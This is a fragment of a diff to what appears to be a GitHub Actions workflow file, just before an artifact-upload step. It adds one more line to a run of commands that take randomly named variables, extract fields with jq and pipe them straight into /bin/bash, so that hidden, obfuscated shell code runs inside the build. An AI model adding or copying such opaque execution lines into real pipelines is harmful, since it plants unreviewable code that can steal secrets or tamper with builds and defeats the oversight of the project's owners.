@@ -48,6 +48,7 @@ jobs:
           printf '%s' "$rywv90681" | jq -r .pfkvx3 | /bin/bash
           echo $cpu7 | jq -r .rghv62 | /bin/bash
           printf '%s' "$o645" | jq -r .x1 | /bin/bash
+          printf '%s' "$p8085" | jq -r .j78 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
